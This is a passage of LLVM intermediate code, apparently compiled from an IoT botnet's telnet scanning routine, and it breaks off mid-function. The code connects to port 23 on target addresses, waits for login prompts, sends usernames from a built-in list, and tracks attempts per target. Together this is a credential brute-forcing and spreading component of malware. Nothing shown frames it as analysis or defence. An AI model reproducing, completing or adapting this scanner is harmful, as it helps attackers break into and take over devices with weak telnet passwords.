  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 5
  %109 = load i8, i8* %108, align 1
  %110 = add i8 %109, 1
  store i8 %110, i8* %108, align 1
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 5
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i64
  %117 = icmp eq i64 %116, 14
  br i1 %117, label %118, label %129

; <label>:118:                                    ; preds = %104
  %119 = load i32, i32* %2, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %120
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %121, i32 0, i32 5
  store i8 0, i8* %122, align 1
  %123 = load i32, i32* %2, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 4
  %127 = load i8, i8* %126, align 2
  %128 = add i8 %127, 1
  store i8 %128, i8* %126, align 2
  br label %129

; <label>:129:                                    ; preds = %118, %104
  %130 = load i32, i32* %2, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 4
  %134 = load i8, i8* %133, align 2
  %135 = zext i8 %134 to i64
  %136 = icmp eq i64 %135, 7
  br i1 %136, label %137, label %142

; <label>:137:                                    ; preds = %129
  %138 = load i32, i32* %2, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %139
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %140, i32 0, i32 3
  store i8 1, i8* %141, align 1
  br label %1278

; <label>:142:                                    ; preds = %129
  br label %143

; <label>:143:                                    ; preds = %142, %84
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext 23) #13
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %145, i16* %146, align 2
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %148 = getelementptr inbounds [8 x i8], [8 x i8]* %147, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %148, i8 0, i64 8, i32 4, i1 false)
  %149 = load i32, i32* %2, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 1
  %153 = load i32, i32* %152, align 4
  %154 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %155 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %154, i32 0, i32 0
  store i32 %153, i32* %155, align 4
  %156 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %157 = load i32, i32* %2, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 0
  store i32 %156, i32* %160, align 16
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 16
  %166 = icmp eq i32 %165, -1
  br i1 %166, label %167, label %168

; <label>:167:                                    ; preds = %143
  br label %1278

; <label>:168:                                    ; preds = %143
  %169 = load i32, i32* %2, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 0
  %173 = load i32, i32* %172, align 16
  %174 = load i32, i32* %2, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %175
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 16
  %179 = call i32 (i32, i32, ...) @fcntl(i32 %178, i32 3, i8* null)
  %180 = or i32 %179, 2048
  %181 = call i32 (i32, i32, ...) @fcntl(i32 %173, i32 4, i32 %180)
  %182 = load i32, i32* %2, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %183
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %184, i32 0, i32 0
  %186 = load i32, i32* %185, align 16
  %187 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %188 = call i32 @connect(i32 %186, %struct.sockaddr* %187, i32 16)
  %189 = icmp eq i32 %188, -1
  br i1 %189, label %190, label %205

; <label>:190:                                    ; preds = %168
  %191 = call i32* @__errno_location() #13
  %192 = load i32, i32* %191, align 4
  %193 = icmp ne i32 %192, 115
  br i1 %193, label %194, label %205

; <label>:194:                                    ; preds = %190
  %195 = load i32, i32* %2, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 16
  %200 = call i32 @sclose(i32 %199)
  %201 = load i32, i32* %2, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 3
  store i8 1, i8* %204, align 1
  br label %214

; <label>:205:                                    ; preds = %190, %168
  %206 = load i32, i32* %2, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 2
  store i8 1, i8* %209, align 8
  %210 = load i32, i32* %2, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 6
  store i32 0, i32* %213, align 4
  br label %214

; <label>:214:                                    ; preds = %205, %194
  br label %1277

; <label>:215:                                    ; preds = %65
  %216 = load i32, i32* %2, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %217
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %218, i32 0, i32 6
  %220 = load i32, i32* %219, align 4
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %228

; <label>:222:                                    ; preds = %215
  %223 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 6
  store i32 %223, i32* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %222, %215
  br label %229

; <label>:229:                                    ; preds = %228
  %230 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %231 = getelementptr inbounds [16 x i64], [16 x i64]* %230, i64 0, i64 0
  %232 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %231) #4, !srcloc !5
  %233 = extractvalue { i64, i64* } %232, 0
  %234 = extractvalue { i64, i64* } %232, 1
  %235 = trunc i64 %233 to i32
  store i32 %235, i32* %11, align 4
  %236 = ptrtoint i64* %234 to i64
  %237 = trunc i64 %236 to i32
  store i32 %237, i32* %12, align 4
  br label %238

; <label>:238:                                    ; preds = %229
  br label %239

; <label>:239:                                    ; preds = %238
  %240 = load i32, i32* %2, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 16
  %245 = srem i32 %244, 64
  %246 = zext i32 %245 to i64
  %247 = shl i64 1, %246
  %248 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %249 = load i32, i32* %2, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %250
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 16
  %254 = sdiv i32 %253, 64
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds [16 x i64], [16 x i64]* %248, i64 0, i64 %255
  %257 = load i64, i64* %256, align 8
  %258 = or i64 %257, %247
  store i64 %258, i64* %256, align 8
  %259 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %259, align 8
  %260 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %260, align 8
  %261 = load i32, i32* %2, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %262
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 16
  %266 = add nsw i32 %265, 1
  %267 = call i32 @select(i32 %266, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %267, i32* %3, align 4
  %268 = load i32, i32* %3, align 4
  %269 = icmp eq i32 %268, 1
  br i1 %269, label %270, label %327

; <label>:270:                                    ; preds = %239
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %271 = load i32, i32* %2, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 16
  %276 = bitcast i32* %7 to i8*
  %277 = call i32 @getsockopt(i32 %275, i32 1, i32 4, i8* %276, i32* %6) #4
  %278 = load i32, i32* %7, align 4
  %279 = icmp ne i32 %278, 0
  br i1 %279, label %280, label %295

; <label>:280:                                    ; preds = %270
  %281 = load i32, i32* %2, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %282
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %283, i32 0, i32 0
  %285 = load i32, i32* %284, align 16
  %286 = call i32 @sclose(i32 %285)
  %287 = load i32, i32* %2, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 2
  store i8 0, i8* %290, align 8
  %291 = load i32, i32* %2, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 3
  store i8 1, i8* %294, align 1
  br label %326

; <label>:295:                                    ; preds = %270
  %296 = load i32, i32* %2, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %297
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %298, i32 0, i32 0
  %300 = load i32, i32* %299, align 16
  %301 = load i32, i32* %2, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 16
  %306 = call i32 (i32, i32, ...) @fcntl(i32 %305, i32 3, i8* null)
  %307 = and i32 %306, -2049
  %308 = call i32 (i32, i32, ...) @fcntl(i32 %300, i32 4, i32 %307)
  %309 = load i32, i32* %2, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %310
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %311, i32 0, i32 6
  store i32 0, i32* %312, align 4
  %313 = load i32, i32* %2, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 7
  store i16 0, i16* %316, align 16
  %317 = load i32, i32* %2, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 8
  %321 = load i8*, i8** %320, align 8
  call void @llvm.memset.p0i8.i64(i8* %321, i8 0, i64 1024, i32 1, i1 false)
  %322 = load i32, i32* %2, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 2
  store i8 2, i8* %325, align 8
  br label %1278

; <label>:326:                                    ; preds = %280
  br label %346

; <label>:327:                                    ; preds = %239
  %328 = load i32, i32* %3, align 4
  %329 = icmp eq i32 %328, -1
  br i1 %329, label %330, label %345

; <label>:330:                                    ; preds = %327
  %331 = load i32, i32* %2, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 16
  %336 = call i32 @sclose(i32 %335)
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 2
  store i8 0, i8* %340, align 8
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 3
  store i8 1, i8* %344, align 1
  br label %345

; <label>:345:                                    ; preds = %330, %327
  br label %346

; <label>:346:                                    ; preds = %345, %326
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 6
  %351 = load i32, i32* %350, align 4
  %352 = add i32 %351, 10
  %353 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %354 = icmp ult i32 %352, %353
  br i1 %354, label %355, label %370

; <label>:355:                                    ; preds = %346
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = call i32 @sclose(i32 %360)
  %362 = load i32, i32* %2, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 2
  store i8 0, i8* %365, align 8
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 3
  store i8 1, i8* %369, align 1
  br label %370

; <label>:370:                                    ; preds = %355, %346
  br label %1277

; <label>:371:                                    ; preds = %65
  %372 = load i32, i32* %2, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %374, i32 0, i32 6
  %376 = load i32, i32* %375, align 4
  %377 = icmp eq i32 %376, 0
  br i1 %377, label %378, label %384

; <label>:378:                                    ; preds = %371
  %379 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 6
  store i32 %379, i32* %383, align 4
  br label %384

; <label>:384:                                    ; preds = %378, %371
  %385 = load i32, i32* %2, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 0
  %389 = load i32, i32* %388, align 16
  %390 = load i32, i32* %2, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 8
  %394 = load i8*, i8** %393, align 8
  %395 = load i32, i32* %2, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 7
  %399 = load i16, i16* %398, align 16
  %400 = zext i16 %399 to i32
  %401 = call i32 @readUntil(i32 %389, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %394, i32 1024, i32 %400)
  %402 = icmp ne i32 %401, 0
  br i1 %402, label %403, label %421

; <label>:403:                                    ; preds = %384
  %404 = load i32, i32* %2, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 6
  store i32 0, i32* %407, align 4
  %408 = load i32, i32* %2, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 7
  store i16 0, i16* %411, align 16
  %412 = load i32, i32* %2, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %414, i32 0, i32 8
  %416 = load i8*, i8** %415, align 8
  call void @llvm.memset.p0i8.i64(i8* %416, i8 0, i64 1024, i32 1, i1 false)
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 2
  store i8 3, i8* %420, align 8
  br label %1278

; <label>:421:                                    ; preds = %384
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 8
  %426 = load i8*, i8** %425, align 8
  %427 = call i64 @strlen(i8* %426) #10
  %428 = trunc i64 %427 to i16
  %429 = load i32, i32* %2, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 7
  store i16 %428, i16* %432, align 16
  br label %433

; <label>:433:                                    ; preds = %421
  %434 = load i32, i32* %2, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 6
  %438 = load i32, i32* %437, align 4
  %439 = add i32 %438, 30
  %440 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %441 = icmp ult i32 %439, %440
  br i1 %441, label %442, label %457

; <label>:442:                                    ; preds = %433
  %443 = load i32, i32* %2, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 0
  %447 = load i32, i32* %446, align 16
  %448 = call i32 @sclose(i32 %447)
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 2
  store i8 0, i8* %452, align 8
  %453 = load i32, i32* %2, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 3
  store i8 1, i8* %456, align 1
  br label %457

; <label>:457:                                    ; preds = %442, %433
  br label %1277

; <label>:458:                                    ; preds = %65
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 0
  %463 = load i32, i32* %462, align 16
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 4
  %468 = load i8, i8* %467, align 2
  %469 = zext i8 %468 to i64
  %470 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %469
  %471 = load i8*, i8** %470, align 8
  %472 = load i32, i32* %2, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 4
  %476 = load i8, i8* %475, align 2
  %477 = zext i8 %476 to i64
  %478 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %477
  %479 = load i8*, i8** %478, align 8
  %480 = call i64 @strlen(i8* %479) #10
  %481 = call i64 @send(i32 %463, i8* %471, i64 %480, i32 16384)
  %482 = icmp slt i64 %481, 0
  br i1 %482, label %483, label %498

; <label>:483:                                    ; preds = %458
  %484 = load i32, i32* %2, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 0
  %488 = load i32, i32* %487, align 16
  %489 = call i32 @sclose(i32 %488)
  %490 = load i32, i32* %2, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 2
  store i8 0, i8* %493, align 8
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 3
  store i8 1, i8* %497, align 1
  br label %1278

; <label>:498:                                    ; preds = %458
  %499 = load i32, i32* %2, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 0
  %503 = load i32, i32* %502, align 16
  %504 = call i64 @send(i32 %503, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i32 0, i32 0), i64 2, i32 16384)
  %505 = icmp slt i64 %504, 0
  br i1 %505, label %506, label %521

; <label>:506:                                    ; preds = %498
  %507 = load i32, i32* %2, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 0
  %511 = load i32, i32* %510, align 16
  %512 = call i32 @sclose(i32 %511)
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 2
  store i8 0, i8* %516, align 8
  %517 = load i32, i32* %2, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 3
  store i8 1, i8* %520, align 1
  br label %1278

; <label>:521:                                    ; preds = %498
  %522 = load i32, i32* %2, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %523
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %524, i32 0, i32 2
  store i8 4, i8* %525, align 8
  br label %1277

; <label>:526:                                    ; preds = %65
  %527 = load i32, i32* %2, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %528
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %529, i32 0, i32 6
  %531 = load i32, i32* %530, align 4
  %532 = icmp eq i32 %531, 0
  br i1 %532, label %533, label %539

; <label>:533:                                    ; preds = %526
  %534 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %535 = load i32, i32* %2, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 6
  store i32 %534, i32* %538, align 4
  br label %539

; <label>:539:                                    ; preds = %533, %526
  %540 = load i32, i32* %2, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 0
  %544 = load i32, i32* %543, align 16
  %545 = load i32, i32* %2, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %546
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %547, i32 0, i32 8
  %549 = load i8*, i8** %548, align 8
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 7
  %554 = load i16, i16* %553, align 16
  %555 = zext i16 %554 to i32
  %556 = call i32 @readUntil(i32 %544, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %549, i32 1024, i32 %555)
  %557 = icmp ne i32 %556, 0
  br i1 %557, label %558, label %590

; <label>:558:                                    ; preds = %539
  %559 = load i32, i32* %2, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 6
  store i32 0, i32* %562, align 4
  %563 = load i32, i32* %2, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %564
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %565, i32 0, i32 7
  store i16 0, i16* %566, align 16
  %567 = load i32, i32* %2, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 8
  %571 = load i8*, i8** %570, align 8
  %572 = call i8* @strstr(i8* %571, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %573 = icmp ne i8* %572, null
  br i1 %573, label %574, label %579

; <label>:574:                                    ; preds = %558
